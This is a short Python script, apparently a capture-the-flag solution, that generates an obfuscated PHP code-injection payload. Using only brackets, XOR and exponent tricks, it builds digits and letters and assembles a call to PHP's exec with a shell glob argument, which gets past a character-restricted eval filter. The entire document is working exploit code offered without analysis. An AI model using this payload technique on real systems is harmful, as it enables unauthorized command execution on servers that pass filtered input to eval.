zero = "([]^[])"
one = "([]^[[]])"
ten = f"{one}.{zero}"
nine = f"{ten}-{one}"
eight = f"{nine}-{one}"
seven = f"{eight}-{one}"
six = f"{seven}-{one}"
five = f"{six}-{one}"
four = f"{five}-{one}"
three = f"{four}-{one}"
two = f"{one}.{one}^({nine})" # A small optimization over 3 - 1

INF = f"({nine})**({one}.{zero}.{zero}.{zero})"
I = f"({INF}.{zero})[{zero}]"  # used for x
N = f"({INF}.{zero})[{one}]"  # used for e,c
F = f"({INF}.{zero})[{two}]"

sf = f"({one}.{zero})**({one}.{zero}.{zero}).{zero}" # 1.0E+100
dot = f"({sf})[{one}]"
E = f"({sf})[{three}]"
plus = f"({sf})[({four})]"
minus = f"((-{one}).{zero})[{zero}]"

# star = f"({dot})^(({four}.{zero})^(({zero}).({zero})))"
# slash = f"({minus})^(({two}.{zero})^(({zero}).({zero})))"
sf2 = f"(({nine}))**({one}.{zero}.{zero})" # 2.<whatever>

slashstar = f"((-({four})).{zero})^(({sf2}).{zero})^({zero}.{zero})"
c = f"({N})^({minus})"
x = f"({I})^({one}.{zero})"
h = f"({dot})^({F})"

payload = f"(({E}).({x}).({E}).({c}))(({slashstar}).({h}))"
print(f"total: {len(payload)}")
# print(f"echo {payload};") # For testing in local php
print(payload)
